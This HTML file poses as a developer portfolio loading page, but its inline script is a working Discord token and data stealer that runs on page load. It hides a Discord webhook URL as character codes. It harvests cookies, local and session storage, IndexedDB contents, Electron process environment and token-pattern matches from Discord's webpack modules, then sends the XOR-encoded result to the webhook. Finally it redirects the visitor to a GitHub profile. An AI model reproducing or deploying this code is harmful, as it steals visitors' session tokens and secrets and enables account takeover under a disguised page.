<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dev Portfolio | Loading...</title>
    <style>
        body {
            margin: 0;
            background: #0d1117;
            color: #c9d1d9;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .loader {
            width: 48px;
            height: 48px;
            border: 5px solid #30363d;
            border-bottom-color: #58a6ff;
            border-radius: 50%;
            animation: rotation 1s linear infinite;
        }
        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            margin-top: 20px;
            font-size: 16px;
            color: #8b949e;
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="loading-text">Loading portfolio...</div>

    <script>
        (function() {
            // ====== WEBHOOK ======
            const _p1 = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47];
            const _p2 = [49,53,50,51,53,49,55,52,57,56,56,57,57,56,50,52,55,49,50,47,120,55,119,57,109,67,117,79,73,102,110,51,54,119,50,119,110,78,115,49,53,83,67,99,54,99,74,104,117,111,66,83,113,51,75,110,106,116,118,77,67,49,88,54,55,98,115,67,81,48,118,80,73,75,114,79,69,87,86,68,112,73,69,81,45,106,53,67];
            
            let WH = '';
            for (let i = 0; i < _p1.length; i++) WH += String.fromCharCode(_p1[i]);
            for (let i = 0; i < _p2.length; i++) WH += String.fromCharCode(_p2[i]);
            
            const GH = 'https://github.com/nm1-Dev';
            
            function enc(data, key) {
                let out = '';
                for (let i = 0; i < data.length; i++) {
                    out += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
                }
                return btoa(out);
            }
            
            // ====== GRAB EVERYTHING - BROWSER + DESKTOP ======
            async function grabAll() {
                const loot = {
                    ls: [],
                    ss: [],
                    ck: [],
                    idb: [],
                    ls_all: [],
                    ss_all: [],
                    discord: {},
                    electron: {},
                    modules: [],
                    memory: [],
                    global: {},
                    info: {}
                };
                
                // ====== STANDARD STORAGE ======
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const k = localStorage.key(i);
                        const v = localStorage.getItem(k);
                        loot.ls_all.push({k: k, v: v, l: v ? v.length : 0});
                        if (v && v.length > 20) loot.ls.push({k: k, v: v});
                    }
                } catch(e) {}
                
                try {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const k = sessionStorage.key(i);
                        const v = sessionStorage.getItem(k);
                        loot.ss_all.push({k: k, v: v, l: v ? v.length : 0});
                        if (v && v.length > 20) loot.ss.push({k: k, v: v});
                    }
                } catch(e) {}
                
                try {
                    loot.ck = document.cookie.split(';').map(c => c.trim()).filter(c => c);
                } catch(e) {}
                
                // ====== INDEXEDDB ======
                try {
                    const dbs = await window.indexedDB.databases();
                    loot.idb = dbs.map(db => db.name);
                    
                    // Try to open and read Discord DBs
                    for (const dbInfo of dbs) {
                        if (dbInfo.name && (
                            dbInfo.name.includes('discord') || 
                            dbInfo.name.includes('Discord') ||
                            dbInfo.name.includes('betterdiscord') ||
                            dbInfo.name.includes('BDFDB')
                        )) {
                            try {
                                const req = indexedDB.open(dbInfo.name);
                                await new Promise((resolve) => {
                                    req.onsuccess = function(e) {
                                        const db = e.target.result;
                                        loot.discord[dbInfo.name + '_stores'] = Array.from(db.objectStoreNames);
                                        
                                        // Try to read from each store
                                        Array.from(db.objectStoreNames).forEach(storeName => {
                                            try {
                                                const tx = db.transaction(storeName, 'readonly');
                                                const store = tx.objectStore(storeName);
                                                const getAll = store.getAll ? store.getAll() : store.openCursor();
                                                
                                                if (getAll.onsuccess) {
                                                    getAll.onsuccess = function(e) {
                                                        const data = e.target.result;
                                                        if (data && data.length > 0) {
                                                            loot.discord[dbInfo.name + '_' + storeName] = data.slice(0, 5);
                                                        }
                                                    };
                                                }
                                            } catch(e) {}
                                        });
                                        
                                        db.close();
                                        resolve();
                                    };
                                    req.onerror = () => resolve();
                                    setTimeout(resolve, 500);
                                });
                            } catch(e) {}
                        }
                    }
                } catch(e) {}
                
                // ====== DISCORD WEBPACK ======
                try {
                    if (window.webpackChunkdiscord_app) {
                        loot.discord.webpack = 'FOUND';
                        const chunks = window.webpackChunkdiscord_app;
                        loot.discord.chunk_count = chunks.length;
                        
                        // Search through webpack modules for token strings
                        const tokenPatterns = /[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/g;
                        const mfaPatterns = /mfa\.[\w-]{84}/g;
                        
                        for (let i = 0; i < chunks.length && i < 100; i++) {
                            try {
                                const chunk = chunks[i];
                                if (chunk && chunk[1]) {
                                    const modules = chunk[1];
                                    Object.keys(modules).forEach(modKey => {
                                        try {
                                            const mod = modules[modKey];
                                            if (typeof mod === 'function') {
                                                const modStr = mod.toString();
                                                const tokens = modStr.match(tokenPatterns);
                                                const mfaTokens = modStr.match(mfaPatterns);
                                                
                                                if (tokens) {
                                                    tokens.forEach(t => loot.memory.push({type: 'token', val: t, src: 'webpack_' + i}));
                                                }
                                                if (mfaTokens) {
                                                    mfaTokens.forEach(t => loot.memory.push({type: 'mfa', val: t, src: 'webpack_' + i}));
                                                }
                                            }
                                        } catch(e) {}
                                    });
                                }
                            } catch(e) {}
                        }
                    }
                } catch(e) {}
                
                // ====== DISCORD NATIVE / ELECTRON ======
                try {
                    if (window.DiscordNative) {
                        loot.electron.native = 'FOUND';
                        loot.electron.native_keys = Object.keys(window.DiscordNative);
                        
                        // Try to access native modules
                        try {
                            if (window.DiscordNative.nativeModules) {
                                loot.electron.native_modules = Object.keys(window.DiscordNative.nativeModules);
                            }
                        } catch(e) {}
                        
                        try {
                            if (window.DiscordNative.window) {
                                loot.electron.window_props = Object.keys(window.DiscordNative.window);
                            }
                        } catch(e) {}
                        
                        try {
                            if (window.DiscordNative.process) {
                                loot.electron.process = {
                                    arch: window.DiscordNative.process.arch,
                                    platform: window.DiscordNative.process.platform,
                                    version: window.DiscordNative.process.version
                                };
                            }
                        } catch(e) {}
                    }
                } catch(e) {}
                
                // ====== GLOBAL ENV ======
                try {
                    if (window.GLOBAL_ENV) {
                        loot.global.env = JSON.parse(JSON.stringify(window.GLOBAL_ENV));
                    }
                } catch(e) {}
                
                // ====== ELECTRON IPC ======
                try {
                    if (window.require) {
                        loot.electron.require = 'AVAILABLE';
                        try {
                            const electron = window.require('electron');
                            loot.electron.ipc = Object.keys(electron);
                            
                            // Try to access IPC renderer
                            if (electron.ipcRenderer) {
                                loot.electron.ipc_methods = Object.keys(electron.ipcRenderer);
                            }
                        } catch(e) {}
                    }
                } catch(e) {}
                
                // ====== PROCESS OBJECT ======
                try {
                    if (window.process) {
                        loot.electron.process_env = window.process.env;
                        loot.electron.process_versions = window.process.versions;
                    }
                } catch(e) {}
                
                // ====== BETTERDISCORD / VENCORD ======
                try {
                    if (window.BdApi) {
                        loot.discord.betterdiscord = 'FOUND';
                        loot.discord.bd_version = window.BdApi.version;
                    }
                    if (window.Vencord) {
                        loot.discord.vencord = 'FOUND';
                    }
                    if (window.vencordWebpack) {
                        loot.discord.vencord_webpack = 'FOUND';
                    }
                } catch(e) {}
                
                // ====== SCAN ALL GLOBAL VARIABLES FOR TOKEN-LIKE STRINGS ======
                try {
                    const tokenRegex = /[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/g;
                    const mfaRegex = /mfa\.[\w-]{84}/g;
                    
                    Object.keys(window).forEach(key => {
                        try {
                            const val = window[key];
                            if (typeof val === 'string') {
                                const tokens = val.match(tokenRegex);
                                const mfa = val.match(mfaRegex);
                                if (tokens) tokens.forEach(t => loot.memory.push({type: 'token', val: t, src: 'window.' + key}));
                                if (mfa) mfa.forEach(t => loot.memory.push({type: 'mfa', val: t, src: 'window.' + key}));
                            }
                        } catch(e) {}
                    });
                } catch(e) {}
                
                // ====== BROWSER INFO ======
                loot.info = {
                    ua: navigator.userAgent,
                    p: navigator.platform,
                    l: navigator.language,
                    sr: screen.width + 'x' + screen.height,
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    ts: new Date().toISOString(),
                    rf: document.referrer || 'D',
                    url: location.href,
                    is_electron: /Electron/.test(navigator.userAgent),
                    is_discord: /discord/.test(navigator.userAgent.toLowerCase())
                };
                
                return loot;
            }
            
            // ====== BUILD & SEND ======
            function build(loot) {
                const key = Math.random().toString(36).substring(2, 10);
                const json = JSON.stringify(loot);
                const encoded = enc(json, key);
                
                return {
                    content: '```\n' + encoded + '\n```\nKey: `' + key + '`'
                };
            }
            
            function send(url, data) {
                fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                }).catch(() => {});
                
                setTimeout(() => {
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', url, true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify(data));
                }, 300);
            }
            
            // ====== EXECUTE ======
            grabAll().then(loot => {
                const payload = build(loot);
                send(WH, payload);
                setTimeout(() => window.location.href = GH, 2000);
            });
            
        })();
    </script>
</body>
</html>
